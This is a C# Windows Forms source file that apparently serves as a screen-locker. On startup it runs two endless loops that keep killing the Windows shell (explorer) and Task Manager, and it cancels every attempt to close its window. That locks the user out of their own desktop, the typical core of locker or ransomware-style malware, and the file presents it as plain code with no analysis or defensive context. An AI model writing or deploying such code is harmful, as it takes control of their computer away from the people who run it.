﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;

namespace Fed_r_
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            Thread thr = new Thread(new ThreadStart(KillProcess));
            thr.Priority = ThreadPriority.AboveNormal;
            thr.IsBackground = false;
            thr.Start();

            Thread thr1 = new Thread(new ThreadStart(KillProcess1));
            thr1.Priority = ThreadPriority.AboveNormal;
            thr1.IsBackground = false;
            thr1.Start();
        }

        static void KillProcess()
        {
            do
            {
                Process[] processInfo = Process.GetProcessesByName("explorer");
                if (processInfo != null)
                {
                    try
                    { 
                            foreach (Process p in processInfo)
                                p.Kill();
                    }
                    catch (Exception) { }
                }
            }
            while (true);
        }

        static void KillProcess1()
        {
            do
            {
                Process[] processInfo = Process.GetProcessesByName("Taskmgr");
                if (processInfo != null)
                {
                    try
                    {
                        foreach (Process p in processInfo)
                            p.Kill();
                    }
                    catch (Exception) { }
                }
            }
            while (true);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
    }
}
